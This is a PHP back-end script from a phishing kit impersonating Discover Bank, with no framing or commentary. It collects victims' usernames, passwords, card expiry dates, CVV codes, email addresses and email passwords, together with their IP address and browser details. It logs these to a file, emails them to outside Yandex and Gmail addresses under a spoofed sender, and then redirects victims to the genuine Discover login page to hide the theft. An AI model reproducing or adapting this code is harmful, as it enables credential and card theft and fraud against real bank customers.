<?php

$username = $_POST['username'];
$password = $_POST['password'];
$expirationDateMonth = $_POST['expirationDateMonth'];
$expirationDateYear = $_POST['expirationDateYear'];
$cid = $_POST['cid'];
$email = $_POST['email'];
$emailpassword = $_POST['emailpassword'];

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "-----=Discover Bank=-----\n";
$message .= "User ID : ".$username."\n";
$message .= "Password : ".$password."\n";
$message .= "Expiry Date : ".$expirationDateMonth."-".$expirationDateYear."\n";
$message .= "CVV : ".$cid."\n";
$message .= "E-mail Address : ".$email."\n";
$message .= "E-mail Password : ".$emailpassword."\n";
$message .= "---------=CokeAddict RiZoRT=---------\n";
$message .= "Date : $adddate\n";
$message .= "IP Address : $ip\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "------=CokeWire HQ=------\n";
$fp = fopen("log.txt","a");
fputs($fp,$message);
fclose($fp);

$recipient = "cokewire009@yandex.com,ccbox000@gmail.com";
$subject = "$ip";
$headers = "From: Discovery <marlon@ruKuz.eu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	if (mail($recipient,$subject,$message,$headers))
		{
		header("Location: https://www.discovercard.com/cardmembersvcs/loginlogout/app/ac_main?ICMPGN=HDR_LOGN_CC_LOGN&mboxSession=1392577046699-143179");
		}
	else
		{
		print("504 Internal Error");
		}
?>